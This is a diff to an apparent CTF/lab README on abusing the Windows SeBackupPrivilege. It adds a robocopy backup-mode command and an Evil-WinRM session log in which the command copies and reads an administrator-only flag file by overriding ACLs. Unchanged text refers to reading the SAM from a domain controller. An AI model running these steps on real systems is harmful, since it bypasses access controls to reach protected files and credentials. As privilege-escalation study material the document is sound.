@@ -1,7 +1,53 @@
 # SeBackupPrivilege
 Fastest method to exploit the SeBackupPrivilege in a windows AD or standalone env 
+# the `fastest X 10000 way` to read root flag is by using robocopy command damn it  😑 😑 😑
+```
+robocopy c:\users\administrator\desktop "C:\users\public\downloads" root.txt /mt /z /b
 
-#  abusing SeBackupPrivilege
+*Evil-WinRM* PS C:\windows\temp> robocopy c:\users\administrator\desktop "C:\users\public\downloads" root.txt /mt /z /b
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+  Started : Tuesday, October 1, 2024 12:02:07 PM
+   Source : c:\users\administrator\desktop\
+     Dest : C:\users\public\downloads\
+
+    Files : root.txt
+
+  Options : /DCOPY:DA /COPY:DAT /B /MT:8 /R:1000000 /W:30
+------------------------------------------------------------------------------
+
+            New File                  34        c:\users\administrator\desktop\root.txt
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         1         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :        34        34         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+   Ended : Tuesday, October 1, 2024 12:02:07 PM
+
+*Evil-WinRM* PS C:\windows\temp> dir c:\users\public\downloads\
+
+
+    Directory: C:\users\public\downloads
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         10/1/2024  11:40 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\windows\temp> type c:\users\public\downloads\root.txt
+7213....a..2ddd...batman.......
+
+N/B: The most important is /b, where
+/b- Copies files in backup mode. In backup mode, robocopy overrides file and folder permission settings (ACLs), which might otherwise block access.
+```
+
+#  abusing SeBackupPrivilege with dlls (not fast as robocopy))
 ```
 The Backup Operators is a Windows built-in group. Users which are part of this group have permissions to perform backup and restore operations. More specifically, these users have the _SeBackupPrivilege_ assigned which enables them to read sensitive files from the domain controller i.e. Security Account Manager (SAM).
 
@@ -131,4 +177,5 @@ The dlls can be found here
 
 ## reference
 [ms-reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672)
+[robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
 
